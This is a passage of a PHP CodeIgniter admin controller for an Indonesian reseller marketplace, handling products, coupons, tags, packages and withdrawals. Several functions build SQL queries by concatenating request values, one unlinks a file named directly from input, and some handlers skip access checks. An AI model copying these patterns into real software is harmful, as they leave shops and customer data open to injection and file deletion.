                              'id_kategori_produk_sub'=>$this->input->post('aa'),
                              'nama_produk'=>$this->input->post('b'),
                              'produk_seo'=>seo_title($this->input->post('b')),
                              'satuan'=>$this->input->post('c'),
                              'harga_beli'=>simpan_rupiah($this->input->post('d')),
                              'harga_reseller'=>simpan_rupiah($this->input->post('e')),
                              'harga_konsumen'=>simpan_rupiah($this->input->post('f')),
                              'minimum'=>$this->input->post('minimum'),
                              'berat'=>$this->input->post('berat'),
                              'gambar'=>$fileName,
                              'tentang_produk'=>$this->input->post('fff'),
                              'keterangan'=>$this->input->post('ff'),
                              'aktif'=>$this->input->post('aktif'),
                              'tag'=>$tag,
                              'username'=>$this->session->username,
                              'waktu_input'=>date('Y-m-d H:i:s'));
            }else{
                $data = array('id_reseller'=>$this->input->post('id_reseller'),
                              'id_kategori_produk'=>$this->input->post('a'),
                              'id_kategori_produk_sub'=>$this->input->post('aa'),
                              'nama_produk'=>$this->input->post('b'),
                              'produk_seo'=>seo_title($this->input->post('b')),
                              'satuan'=>$this->input->post('c'),
                              'harga_beli'=>simpan_rupiah($this->input->post('d')),
                              'harga_reseller'=>simpan_rupiah($this->input->post('e')),
                              'harga_konsumen'=>simpan_rupiah($this->input->post('f')),
                              'minimum'=>$this->input->post('minimum'),
                              'berat'=>$this->input->post('berat'),
                              'tentang_produk'=>$this->input->post('fff'),
                              'keterangan'=>$this->input->post('ff'),
                              'aktif'=>$this->input->post('aktif'),
                              'tag'=>$tag,
                              'username'=>$this->session->username,
                              'waktu_input'=>date('Y-m-d H:i:s'));
            }
            $this->model_app->insert('rb_produk',$data);
            $id_produk = $this->db->insert_id();

            if ($this->input->post('variasi1')!=''){
                $warna = array('id_produk'=>$id_produk,
                                'nama'=>cetak($this->input->post('variasi1')),
                                'variasi'=>implode(";",cetak($this->input->post('warna'))));
                $this->model_app->insert('rb_produk_variasi',$warna);
            }

            if ($this->input->post('variasi2')!=''){
                $ukuran = array('id_produk'=>$id_produk,
                                'nama'=>cetak($this->input->post('variasi2')),
                                'variasi'=>implode(";",cetak($this->input->post('ukuran'))));
                $this->model_app->insert('rb_produk_variasi',$ukuran);
            }

            if ($this->input->post('variasi3')!=''){
                $lainnya = array('id_produk'=>$id_produk,
                                'nama'=>cetak($this->input->post('variasi3')),
                                'variasi'=>implode(";",cetak($this->input->post('lainnya'))));
                $this->model_app->insert('rb_produk_variasi',$lainnya);
            }
            
            // Stok Produk Untuk Perusahaan
            if ($this->input->post('stok') > '0' AND $this->input->post('id_reseller')=='0'){
				$kode_transaksi = "PO-".date('YmdHis');
				$data1 = array('kode_pembelian'=>$kode_transaksi,
			        		  'id_supplier'=>1,
			        		  'waktu_beli'=>date('Y-m-d H:i:s'));
				$this->model_app->insert('rb_pembelian',$data1);
				$idp = $this->db->insert_id();

				$data2 = array('id_pembelian'=>$idp,
		        			  'id_produk'=>$id_produk,
							  'jumlah_pesan'=>cetak($this->input->post('stok')),
		        			  'harga_pesan'=>simpan_rupiah(cetak($this->input->post('d'))),
							  'satuan'=>cetak($this->input->post('c')));
				$this->model_app->insert('rb_pembelian_detail',$data2);
			}

            // Tambah Stok Untuk Pelapak/Toko
			if ((int)$this->input->post('stok') > '0' AND $this->input->post('id_reseller')!='0'){
                $kode_transaksi = "TRX-".date('YmdHis');
                $data = array('kode_transaksi'=>$kode_transaksi,
                            'id_pembeli'=>$this->input->post('id_reseller'),
                            'id_penjual'=>'1',
                            'status_pembeli'=>'reseller',
                            'status_penjual'=>'admin',
                            'service'=>'Stok Otomatis (Pribadi)',
                            'waktu_transaksi'=>date('Y-m-d H:i:s'),
                            'proses'=>'4');
                $this->model_app->insert('rb_penjualan',$data);
                $idp = $this->db->insert_id();

                $data = array('id_penjualan'=>$idp,
                            'id_produk'=>$id_produk,
                            'jumlah'=>cetak($this->input->post('stok')),
                            'harga_jual'=>cetak($this->input->post('e')),
                            'satuan'=>cetak($this->input->post('c')));
                $this->model_app->insert('rb_penjualan_detail',$data);
            }

			if (simpan_rupiah(cetak($this->input->post('diskon'))) > 0){
            	$cek = $this->db->query("SELECT * FROM rb_produk_diskon where id_produk='$id_produk' AND id_reseller='".$this->input->post('id_reseller')."'");
				if ($cek->num_rows()>=1){
					$data = array('diskon'=>simpan_rupiah(cetak($this->input->post('diskon'))));
					$where = array('id_produk' => cetak($id_produk),'id_reseller' => cetak($this->input->post('id_reseller')));
					$this->model_app->update('rb_produk_diskon', $data, $where);
				}else{
					$data = array('id_produk'=>cetak($id_produk),
			                      'id_reseller'=>cetak($this->input->post('id_reseller')),
			                      'diskon'=>simpan_rupiah(cetak($this->input->post('diskon'))));
					$this->model_app->insert('rb_produk_diskon',$data);
				}
			}
            redirect('administrator/produk');
        }else{
            $data['tag'] = $this->model_app->view_ordering('tagpro','id_tag','DESC');
            $data['record'] = $this->model_app->view_ordering('rb_kategori_produk','id_kategori_produk','DESC');
            $this->template->load('administrator/template','administrator/additional/mod_produk/view_produk_tambah',$data);
        }
    }

    function edit_produk(){
        cek_session_akses('produk',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            if ($this->session->sesi_produk!=''){
                $rows = $this->db->query("SELECT GROUP_CONCAT(file_name SEPARATOR ';') as files FROM `img_comment` where id_comment='".$this->session->sesi_produk."'")->row_array();
                $fileName = $rows['files'];
            }else{
                $fileName = '';
            }

            if ($this->input->post('tag')!=''){
                $tag_seo = $this->input->post('tag');
                $tag=implode(',',$tag_seo);
            }else{
                $tag = '';
            }
            
            $fp = $this->db->query("SELECT fee_produk FROM rb_produk where id_produk='".$this->input->post('id')."'")->row_array();
            if (config('fee_produk')=='Y'){ $fee_produk = simpan_rupiah($this->input->post('fee_produk')); }else{ $fee_produk = $fp['fee_produk']; }

            if (trim($fileName)!=''){
                $data = array('id_reseller'=>$this->input->post('id_reseller'),
                              'id_kategori_produk'=>$this->input->post('a'),
                              'id_kategori_produk_sub'=>$this->input->post('aa'),
                              'nama_produk'=>$this->input->post('b'),
                              'produk_seo'=>seo_title($this->input->post('b')),
                              'satuan'=>$this->input->post('c'),
                              'harga_beli'=>simpan_rupiah($this->input->post('d')),
                              'harga_reseller'=>simpan_rupiah($this->input->post('e')),
                              'harga_konsumen'=>simpan_rupiah($this->input->post('f')),
                              'fee_produk'=>$fee_produk,
                              'minimum'=>$this->input->post('minimum'),
                              'berat'=>$this->input->post('berat'),
                              'gambar'=>$fileName,
                              'tentang_produk'=>$this->input->post('fff'),
                              'keterangan'=>$this->input->post('ff'),
                              'aktif'=>$this->input->post('aktif'),
                              'tag'=>$tag,
                              'username'=>$this->session->username);
            }else{
                $data = array('id_reseller'=>$this->input->post('id_reseller'),
                              'id_kategori_produk'=>$this->input->post('a'),
                              'id_kategori_produk_sub'=>$this->input->post('aa'),
                              'nama_produk'=>$this->input->post('b'),
                              'produk_seo'=>seo_title($this->input->post('b')),
                              'satuan'=>$this->input->post('c'),
                              'harga_beli'=>simpan_rupiah($this->input->post('d')),
                              'harga_reseller'=>simpan_rupiah($this->input->post('e')),
                              'harga_konsumen'=>simpan_rupiah($this->input->post('f')),
                              'fee_produk'=>$fee_produk,
                              'minimum'=>$this->input->post('minimum'),
                              'berat'=>$this->input->post('berat'),
                              'tentang_produk'=>$this->input->post('fff'),
                              'keterangan'=>$this->input->post('ff'),
                              'aktif'=>$this->input->post('aktif'),
                              'tag'=>$tag,
                              'username'=>$this->session->username);
            }

            $where = array('id_produk' => $this->input->post('id'));
            $this->model_app->update('rb_produk', $data, $where);
            
            // Stok Produk Untuk Perusahaan
            if ($this->input->post('stok') > '0'){
                if ($this->input->post('id_reseller')=='0'){
    				$kode_transaksi = "PO-".date('YmdHis');
    				$data1 = array('kode_pembelian'=>$kode_transaksi,
    			        		  'id_supplier'=>1,
    			        		  'waktu_beli'=>date('Y-m-d H:i:s'));
    				$this->model_app->insert('rb_pembelian',$data1);
    				$idp = $this->db->insert_id();
    
    				$data2 = array('id_pembelian'=>$idp,
    		        			  'id_produk'=>cetak($this->input->post('id')),
    							  'jumlah_pesan'=>cetak($this->input->post('stok')),
    		        			  'harga_pesan'=>simpan_rupiah(cetak($this->input->post('d'))),
    							  'satuan'=>cetak($this->input->post('c')));
    				$this->model_app->insert('rb_pembelian_detail',$data2);
                }else{
                    $kode_transaksi = "TRX-".date('YmdHis');
    				$data1 = array('kode_transaksi'=>$kode_transaksi,
    			        		  'id_pembeli'=>cetak($this->input->post('id_reseller')),
    			        		  'id_penjual'=>'1',
    			        		  'status_pembeli'=>'reseller',
    							  'status_penjual'=>'admin',
    							  'no_resi'=>'-',
    							  'kode_kurir'=>'-',
    							  'kurir'=>'-',
    							  'service'=>'Stok Otomatis (Pribadi)',
    							  'ongkir'=>'0',
    							  'keterangan'=>'-',
    			        		  'waktu_transaksi'=>date('Y-m-d H:i:s'),
    			        		  'proses'=>'4');
    				$this->model_app->insert('rb_penjualan',$data1);
    				$idp = $this->db->insert_id();
    
    				$data2 = array('id_penjualan'=>$idp,
    		        			  'id_produk'=>cetak($this->input->post('id')),
    							  'jumlah'=>cetak($this->input->post('stok')),
    							  'diskon'=>'0',
    		        			  'harga_jual'=>simpan_rupiah(cetak($this->input->post('e'))),
    							  'satuan'=>cetak($this->input->post('c')),
    							  'keterangan_order'=>'-');
    				$this->model_app->insert('rb_penjualan_detail',$data2);
                }
			}

            $id_produk = cetak($this->input->post('id'));
			$id_variasi = array('id_produk' => $id_produk);
			$this->model_app->delete('rb_produk_variasi',$id_variasi);
			if ($this->input->post('variasix1')!=''){
				$warna = array('id_produk'=>$id_produk,
								'nama'=>cetak($this->input->post('variasix1')),
								'variasi'=>implode(";",$this->input->post('variasi1')));
				$this->model_app->insert('rb_produk_variasi',$warna);
			}

			if ($this->input->post('variasix2')!=''){
				$ukuran = array('id_produk'=>$id_produk,
								'nama'=>cetak($this->input->post('variasix2')),
								'variasi'=>implode(";",$this->input->post('variasi2')));
				$this->model_app->insert('rb_produk_variasi',$ukuran);
			}

			if ($this->input->post('variasix3')!=''){
				$lainnya = array('id_produk'=>$id_produk,
								'nama'=>cetak($this->input->post('variasix3')),
								'variasi'=>implode(";",$this->input->post('variasi3')));
				$this->model_app->insert('rb_produk_variasi',$lainnya);
			}
			
			if (simpan_rupiah(cetak($this->input->post('diskon'))) > 0){
            	$cek = $this->db->query("SELECT * FROM rb_produk_diskon where id_produk='".$this->input->post('id')."' AND id_reseller='".$this->input->post('id_reseller')."'");
				if ($cek->num_rows()>=1){
					$data = array('diskon'=>simpan_rupiah(cetak($this->input->post('diskon'))));
					$where = array('id_produk' => cetak($this->input->post('id')),'id_reseller' => cetak($this->input->post('id_reseller')));
					$this->model_app->update('rb_produk_diskon', $data, $where);
				}else{
					$data = array('id_produk'=>cetak($this->input->post('id')),
			                      'id_reseller'=>cetak($this->input->post('id_reseller')),
			                      'diskon'=>simpan_rupiah(cetak($this->input->post('diskon'))));
					$this->model_app->insert('rb_produk_diskon',$data);
				}
			}
			
            redirect('administrator/produk');
        }else{
            $data['tag'] = $this->model_app->view_ordering('tagpro','id_tag','DESC');
            $data['record'] = $this->model_app->view_ordering('rb_kategori_produk','id_kategori_produk','DESC');
            $data['rows'] = $this->model_app->edit('rb_produk',array('id_produk'=>$id))->row_array();
            $this->template->load('administrator/template','administrator/additional/mod_produk/view_produk_edit',$data);
        }
    }

public function deleteFile(){
    cek_session_akses('produk',$this->session->id_session);
    $name = $this->input->post('name');
    $filePath = 'asset/foto_produk/'.$name;
    $thumb_filePath = 'asset/foto_produk/thumb_'.$name;
    if($name){
        if (file_exists($filePath)) 
        {
            unlink($filePath); // delete file from dir
            unlink($thumb_filePath); // delete file from dir
        }
        $this->db->delete('img_comment', array('file_name' => $name));
    }

    echo "Deleted File ".$name."<br>";
}

public function upload(){
    cek_session_akses('produk',$this->session->id_session);
    $this->load->model('imgComment');
    $data = array();
    if ($this->session->sesi_produk==''){
        $id = $this->session->username.'-produk-'.date('Ymdhis');
        $this->session->set_userdata(array('sesi_produk'=>$id));
    }else{
        $id = $this->session->sesi_produk;
    }
    if(isset($_FILES['uploadFile'])){
        // File upload configuration
        $uploadPath = 'asset/foto_produk/';
        $config['upload_path'] = $uploadPath;
        $config['allowed_types'] = 'jpg|jpeg|png|txt|pdf|gif|zip|rar|tar';
        $config['max_size']	= '50000'; // kb

        // Load and initialize upload library
        $this->load->library('upload', $config);
        $this->upload->initialize($config);	

        $fileName = $_FILES["uploadFile"]["name"];

        // Upload file to server
        if($this->upload->do_upload('uploadFile')){
            $fileData = $this->upload->data();
            //Compress Image
            $config['image_library']='gd2';
            $config['source_image']='./asset/foto_produk/'.$fileData['file_name'];
            $config['create_thumb']= FALSE;
            $config['maintain_ratio']= FALSE;
            $config['quality']= '50%';
            $config['width']= 191;
            $config['height']= 171;
            $config['new_image']= './asset/foto_produk/thumb_'.$fileData['file_name'];
            $this->load->library('image_lib', $config);
            $this->image_lib->resize();

            $uploadData['file_name'] = $fileData['file_name'];
            $uploadData['uploaded_on'] = date("Y-m-d H:i:s");
            $uploadData['id_comment'] = $id;
        }

        if(!empty($uploadData)){
            $insert = $this->imgComment->insert($uploadData);
            $data[] = $uploadData['file_name'];
            echo json_encode($data);
        }
    }else{
        echo json_encode('param is empty.');
    }
}
    
    function reseller_produk(){
        cek_session_akses('produk',$this->session->id_session);
        $id = $this->uri->segment(3);
        $rows = $this->model_app->edit('rb_produk',array('id_produk'=>$id))->row_array();

        $data = array('id_kategori_produk'=>$rows['id_kategori_produk'],
                        'id_kategori_produk_sub'=>$rows['id_kategori_produk_sub'],
                        'nama_produk'=>$rows['nama_produk'],
                        'produk_seo'=>$rows['produk_seo'].'-'.date('His'),
                        'satuan'=>$rows['satuan'],
                        'harga_beli'=>$rows['harga_beli'],
                        'harga_reseller'=>$rows['harga_reseller'],
                        'harga_konsumen'=>$rows['harga_konsumen'],
                        'berat'=>$rows['berat'],
                        'gambar'=>$rows['gambar'],
                        'tentang_produk'=>$rows['tentang_produk'],
                        'keterangan'=>$rows['keterangan'],
                        'aktif'=>Y,
                        'tag'=>$rows['tag'],
                        'username'=>$this->session->username,
                        'waktu_input'=>date('Y-m-d H:i:s'));
            
            $this->model_app->insert('rb_produk',$data);
            redirect('administrator/produk');
    }

    private function set_upload_options(){
        $config = array();
        $config['upload_path'] = 'asset/foto_produk/';
        $config['allowed_types'] = 'gif|jpg|png|jpeg|JPG|JPEG|PNG|GIF';
        $config['max_size'] = '10000'; // kb
        $config['encrypt_name'] = FALSE;
        $this->load->library('upload', $config);
      return $config;
    }

    function delete_produk(){
        cek_session_akses('produk',$this->session->id_session);
        $id = array('id_produk' => $this->uri->segment(3));
        $row = $this->db->query("SELECT * FROM rb_produk where id_produk='".$this->uri->segment(3)."'")->row_array();
        $ex = explode(';',$row['gambar']);
        for($i=0; $i<count($ex); $i++){
            unlink('asset/foto_produk/'.$ex[$i]);
        }
        $this->model_app->delete('rb_produk',$id);
        redirect('administrator/produk');
    }

    function kupon(){
		$id_produk = cetak($this->uri->segment(3));
		$kupon = $this->db->query("SELECT a.*,COALESCE(b.used, 0) as used FROM
		(SELECT * FROM rb_produk_kupon where id_produk='$id_produk') as a LEFT JOIN
		(select id_kupon, COUNT(*) used from rb_penjualan_kupon GROUP BY id_kupon HAVING COUNT(id_kupon)) as b on a.id_kupon=b.id_kupon")->result();
		echo json_encode($kupon);
	}

	function kupon_save(){
		if (cetak($this->input->post('a'))!=''){
			$data = array('id_produk'=>cetak($this->input->post('id_produk')),
						'kode_kupon'=>cetak($this->input->post('a')),
						'nilai_kupon'=>cetak(simpan_rupiah($this->input->post('d'))),
						'jumlah_kupon'=>cetak($this->input->post('b')),
						'min_order'=>cetak($this->input->post('e')),
						'expire_date'=>cetak($this->input->post('c')),
						'created_date'=>date('Y-m-d H:i:s'));
			if ($this->input->post('id_kupon')==''){
				$result = $this->model_app->insert('rb_produk_kupon',$data);
			}else{
				$where = array('id_kupon' => cetak($this->input->post('id_kupon')));
            	$result = $this->model_app->update('rb_produk_kupon', $data, $where);
			}
			echo json_encode($result);
		}
	}

    function kupon_delete(){
		$cek = $this->db->query("SELECT * FROM rb_penjualan_kupon where id_kupon='".cetak($this->input->post('id'))."'");
		if ($cek->num_rows()<=0){
			$result = $this->db->query("DELETE FROM rb_produk_kupon where id_kupon='".cetak($this->input->post('id'))."'");
			echo json_encode($result);
		}
	}


        // Controller Modul Tag Berita

    function tagpro(){
        cek_session_akses('tagpro',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_ordering('tagpro','id_tag','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('tagpro',array('username'=>$this->session->username),'id_tag','DESC');
        }
        $this->template->load('administrator/template','administrator/additional/mod_tagpro/view_tag',$data);
    }

    function tambah_tagpro(){
        cek_session_akses('tagpro',$this->session->id_session);
        if (isset($_POST['submit'])){
            $data = array('nama_tag'=>$this->db->escape_str($this->input->post('a')),
                        'username'=>$this->session->username,
                        'tag_seo'=>seo_title($this->input->post('a')),
                        'count'=>'0');
            $this->model_app->insert('tagpro',$data);  
            redirect($this->uri->segment(1).'/tagpro');
        }else{
            $this->template->load('administrator/template','administrator/additional/mod_tagpro/view_tag_tambah');
        }
    }

    function edit_tagpro(){
        cek_session_akses('tagpro',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $data = array('nama_tag'=>$this->db->escape_str($this->input->post('a')),
                        'username'=>$this->session->username,
                        'tag_seo'=>seo_title($this->input->post('a')));
            $where = array('id_tag' => $this->input->post('id'));
            $this->model_app->update('tagpro', $data, $where);
            redirect($this->uri->segment(1).'/tagpro');
        }else{
            if ($this->session->level=='admin'){
                 $proses = $this->model_app->edit('tagpro', array('id_tag' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('tagpro', array('id_tag' => $id, 'username' => $this->session->username))->row_array();
            }
            $data = array('rows' => $proses);
            $this->template->load('administrator/template','administrator/additional/mod_tagpro/view_tag_edit',$data);
        }
    }

    function delete_tagpro(){
        cek_session_akses('tagpro',$this->session->id_session);
        if ($this->session->level=='admin'){
            $id = array('id_tag' => $this->uri->segment(3));
        }else{
            $id = array('id_tag' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
        $this->model_app->delete('tagpro',$id);
        redirect($this->uri->segment(1).'/tagpro');
    }

    // Controller Modul Paket

    function paket(){
        cek_session_akses('paket',$this->session->id_session);
        $data['record'] = $this->model_app->view_ordering('rb_paket','id_paket','DESC');
        $this->template->load('administrator/template','administrator/additional/mod_paket/view',$data);
    }

    function tambah_paket(){
        cek_session_akses('paket',$this->session->id_session);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_produk/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|jpeg';
            $config['max_size'] = '5000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('icon_image');
            $hasil_icon=$this->upload->data();
            if ($hasil_icon['file_name']==''){
                $data = array('nama_paket'=>$this->input->post('nama_paket'),
                            'judul'=>$this->input->post('judul'),
                            'keterangan'=>$this->input->post('keterangan'),
                            'durasi'=>$this->input->post('durasi'),
                            'harga'=>$this->input->post('harga'),
                            'icon_kode'=>$this->input->post('icon_kode'),
                            'max_produk'=>$this->input->post('max_produk'));
            }else{
                $data = array('nama_paket'=>$this->input->post('nama_paket'),
                            'judul'=>$this->input->post('judul'),
                            'keterangan'=>$this->input->post('keterangan'),
                            'durasi'=>$this->input->post('durasi'),
                            'harga'=>$this->input->post('harga'),
                            'icon_kode'=>$this->input->post('icon_kode'),
                            'icon_image'=>$hasil_icon['file_name'],
                            'max_produk'=>$this->input->post('max_produk'));
            }
            $this->model_app->insert('rb_paket',$data);  
            redirect($this->uri->segment(1).'/paket');
        }else{
            $this->template->load('administrator/template','administrator/additional/mod_paket/tambah');
        }
    }

    function edit_paket(){
        cek_session_akses('paket',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_produk/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|jpeg';
            $config['max_size'] = '5000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('icon_image');
            $hasil_icon=$this->upload->data();
            if ($hasil_icon['file_name']==''){
                $data = array('nama_paket'=>$this->input->post('nama_paket'),
                            'judul'=>$this->input->post('judul'),
                            'keterangan'=>$this->input->post('keterangan'),
                            'durasi'=>$this->input->post('durasi'),
                            'harga'=>$this->input->post('harga'),
                            'icon_kode'=>$this->input->post('icon_kode'),
                            'max_produk'=>$this->input->post('max_produk'));
            }else{
                $data = array('nama_paket'=>$this->input->post('nama_paket'),
                            'judul'=>$this->input->post('judul'),
                            'keterangan'=>$this->input->post('keterangan'),
                            'durasi'=>$this->input->post('durasi'),
                            'harga'=>$this->input->post('harga'),
                            'icon_kode'=>$this->input->post('icon_kode'),
                            'icon_image'=>$hasil_icon['file_name'],
                            'max_produk'=>$this->input->post('max_produk'));
            }
            $where = array('id_paket' => $this->input->post('id'));
            $this->model_app->update('rb_paket', $data, $where);
            redirect($this->uri->segment(1).'/paket');
        }else{
            $proses = $this->model_app->edit('rb_paket', array('id_paket' => $id))->row_array();
            $data = array('rows' => $proses);
            $this->template->load('administrator/template','administrator/additional/mod_paket/edit',$data);
        }
    }

    function delete_paket(){
        cek_session_akses('paket',$this->session->id_session);
        $id = array('id_paket' => $this->uri->segment(3));
        $this->model_app->delete('rb_paket',$id);
        redirect($this->uri->segment(1).'/paket');
    }

    function withdraw(){
        cek_session_akses('withdraw',$this->session->id_session);
        $data['record'] = $this->db->query("SELECT a.*, a.keterangan as keterangan_order, b.keterangan FROM rb_withdraw a LEFT JOIN rb_konsumen_detail b ON a.id_rekening_reseller=b.id_konsumen_detail ORDER BY a.id_withdraw DESC");
        $this->template->load('administrator/template','administrator/additional/mod_rekening/withdraw',$data);
    }

    function tambah_withdraw(){
        cek_session_akses('withdraw',$this->session->id_session);
        if (isset($_POST['submit'])){
			if (cetak($this->input->post('jenis'))=='debit'){
				$nominal = clean_rupiah(cetak($this->input->post('b')));
                $data = array('id_rekening_reseller'=>cetak($this->input->post('a')),
                            'id_reseller'=>cetak($this->input->post('id_reseller')),
                            'nominal'=>$nominal,
                            'status'=>'Sukses',
                            'akun'=>'konsumen',
                            'transaksi'=>cetak($this->input->post('jenis')),
                            'waktu_withdraw'=>date('Y-m-d H:i:s'));
                        $this->model_app->insert('rb_withdraw',$data);
			}else{
				$nominal = clean_rupiah(cetak($this->input->post('b')))+rand(100,999);
				$data = array('id_rekening_reseller'=>cetak($this->input->post('a')),
                          'id_reseller'=>cetak($this->input->post('id_reseller')),
			              'nominal'=>$nominal,
                          'status'=>'Sukses',
                          'akun'=>'konsumen',
						  'transaksi'=>cetak($this->input->post('jenis')),
			              'waktu_withdraw'=>date('Y-m-d H:i:s'));
						$this->model_app->insert('rb_withdraw',$data);
			}
			redirect($this->uri->segment(1).'/withdraw');
		}else{
            $this->template->load('administrator/template','administrator/additional/mod_rekening/withdraw_tambah',$data);
        }
    }

    function rekening_pilih(){
		cek_session_akses('withdraw',$this->session->id_session);
		$jenis = $this->input->post('jenis');
		if ($jenis=='debit'){
            $id_reseller = $this->input->post('id_reseller');
			$rekening = $this->db->query("SELECT * FROM rb_konsumen_detail where id_konsumen='".$id_reseller."' AND status='rekening'");
			if ($rekening->num_rows()=='0'){
				echo "<option value=''>Maaf, Anda Belum memiliki No Rekening</option>";
			}else{
				foreach ($rekening->result_array() as $row) {
					$ex = explode(';',$row['keterangan']);
					echo "<option value='$row[id_konsumen_detail]'>$ex[0], $ex[1], A/N : $ex[2]</option>";
				}
			}
		}else{
			$rekening = $this->db->query("SELECT * FROM rb_rekening");
			foreach ($rekening->result_array() as $row) {
				echo "<option value='$row[id_rekening]'>$row[nama_bank], $row[no_rekening], A/N : $row[pemilik_rekening]</option>";
			}
		}
	}

    function proses_withdraw(){
        cek_session_akses('withdraw',$this->session->id_session);
        $data = array('status'=>$this->uri->segment(4));
        $where = array('id_withdraw' => $this->uri->segment(3));
        $this->model_app->update('rb_withdraw', $data, $where);

        // Kirim Notifikasi Withdraw ke Konsumen
        $cek = $this->db->query("SELECT * FROM rb_withdraw where id_withdraw='".$this->uri->segment(3)."'")->row_array();
        if ($cek['akun']=='reseller'){
            $row = $this->db->query("SELECT b.* FROM rb_reseller a JOIN rb_konsumen b ON a.id_konsumen=b.id_konsumen where a.id_reseller='$cek[id_reseller]'")->row_array();
            $nama = $row['nama_lengkap'];
            $tujuan = $row['no_hp'];
            $email = $row['email'];
        }else{
            $row = $this->db->query("SELECT * FROM rb_konsumen where id_konsumen='$cek[id_reseller]'")->row_array();
            $nama = $row['nama_lengkap'];
            $tujuan = $row['no_hp'];
            $email = $row['email'];
        }

        if ($cek['transaksi']=='kredit'){ $request = 'Deposit'; }else{ $request = 'Withdraw'; }
        if ($this->uri->segment(4)=='Sukses'){
            $iden = $this->model_app->view_where('identitas',array('id_identitas'=>'1'))->row_array();
            $isi_pesan = "*$iden[pengirim_email]* - Haloo Bpk/Ibk. *$nama*, Permintaan anda untuk $request Rp ".rupiah($cek['nominal'])." - ".rupiah($cek['withdraw_fee'])." ($request Fee) = <b>".rupiah($cek['nominal']-$cek['withdraw_fee'])."</b> Sukses Diproses,..";
            $this->model_app->wa(format_telpon($tujuan),$isi_pesan);

            $subject_notif      = "$iden[pengirim_email] - $request Sukses";
            $message_notif = "<html><body><b>$iden[pengirim_email]</b> - Haloo Bpk/Ibk. <b>$nama</b>, Permintaan anda untuk $request Rp ".rupiah($cek['nominal'])." - ".rupiah($cek['withdraw_fee'])."  ($request Fee) = <b>".rupiah($cek['nominal']-$cek['withdraw_fee'])."</b> Sukses Diproses,..</body></html>";
            echo kirim_email($subject_notif,$message_notif,$email);

        }elseif ($this->uri->segment(4)=='Batal'){
            $iden = $this->model_app->view_where('identitas',array('id_identitas'=>'1'))->row_array();
            $isi_pesan = "*$iden[pengirim_email]* - Haloo Bpk/Ibk. *$nama*, Permintaan anda untuk $request Rp ".rupiah($cek['nominal'])." Gagal/Dibatalkan,..";
            $this->model_app->wa(format_telpon($tujuan),$isi_pesan);

            $subject_notif      = "$iden[pengirim_email] - $request Gagal/Dibatalkan";
            $message_notif = "<html><body><b>$iden[pengirim_email]</b> - Haloo Bpk/Ibk. <b>$nama</b>, Permintaan anda untuk $request Rp ".rupiah($cek['nominal'])." Gagal/Dibatalkan,..</body></html>";
            echo kirim_email($subject_notif,$message_notif,$email);
        }

        redirect($this->uri->segment(1).'/withdraw');
    }

    function reseller_paket(){
        cek_session_akses('reseller_paket',$this->session->id_session);
        $data['record'] = $this->db->query("SELECT * FROM rb_reseller_paket a JOIN rb_reseller b ON a.id_reseller=b.id_reseller JOIN rb_paket c ON a.id_paket=c.id_paket ORDER BY a.waktu_paket DESC");
        $this->template->load('administrator/template','administrator/additional/mod_reseller/reseller_paket',$data);
    }

    function reseller_transaksi(){
        cek_session_akses('reseller_transaksi',$this->session->id_session);
        $data['record'] = $this->db->query("SELECT b.* FROM `rb_penjualan` a JOIN rb_reseller b ON a.id_penjual=b.id_reseller where a.status_pembeli='konsumen' GROUP BY a.id_penjual");
        $this->template->load('administrator/template','administrator/additional/mod_reseller/reseller_transaksi',$data);
    }

    function penawaran(){
        cek_session_akses('penawaran',$this->session->id_session);
        $data['record'] = $this->model_reseller->produk_flashdeal(0,0,10);
        $this->template->load('administrator/template','administrator/additional/mod_produk/penawaran',$data);
    }

    function add_penawaran(){
        $cek = $this->db->query("SELECT * FROM rb_produk_penawaran where id_produk='".$this->uri->segment(3)."'");
        if ($cek->num_rows()>=1){
            echo $this->session->set_flashdata('message', '<div class="alert alert-danger"><center>GAGAL - Produk sudah masuk ke List Penawaran (Flash Deal)!!</center></div>');
        }else{
            $data = array('id_produk'=>$this->uri->segment(3),
                    'waktu_input'=>date('Y-m-d H:i:s'));
            $this->model_app->insert('rb_produk_penawaran',$data); 
            echo $this->session->set_flashdata('message', '<div class="alert alert-success"><center>Berhasil Menambahkan ke Daftar Penawaran (Flash Deal)!!</center></div>');
        }
        redirect($this->uri->segment(1).'/penawaran');
    }

    function delete_penawaran(){
        cek_session_akses('penawaran',$this->session->id_session);
        $id = array('id_produk_penawaran' => $this->uri->segment(3));
        $this->model_app->delete('rb_produk_penawaran',$id);
        redirect($this->uri->segment(1).'/penawaran');
    }

    function proses_reseller_paket(){
        cek_session_akses('reseller_paket',$this->session->id_session);
        $cek = $this->db->query("SELECT * FROM rb_paket where id_paket='".$this->uri->segment(5)."'")->row_array();
        
        if ($this->uri->segment(4)=='N'){
            $expire = date('Y-m-d');
        }else{
            $date=date_create(date('Y-m-d'));
            date_add($date,date_interval_create_from_date_string("$cek[durasi] days"));
            $expire = date_format($date,"Y-m-d");
        }
        $data = array('status'=>$this->uri->segment(4),
                      'expire_date'=>$expire);
        $where = array('id_reseller_paket' => $this->uri->segment(3));
        $this->model_app->update('rb_reseller_paket', $data, $where);
        redirect($this->uri->segment(1).'/reseller_paket');
    }

    // Controller Modul Rekening

    function rekening(){
        cek_session_akses('rekening',$this->session->id_session);
        $data['record'] = $this->model_app->view_ordering('rb_rekening','id_rekening','DESC');
        $this->template->load('administrator/template','administrator/additional/mod_rekening/view_rekening',$data);
    }

    function tambah_rekening(){
        cek_session_akses('rekening',$this->session->id_session);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/images/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|swf';
            $config['max_size'] = '5000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('gambar');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('nama_bank'=>$this->db->escape_str($this->input->post('a')),
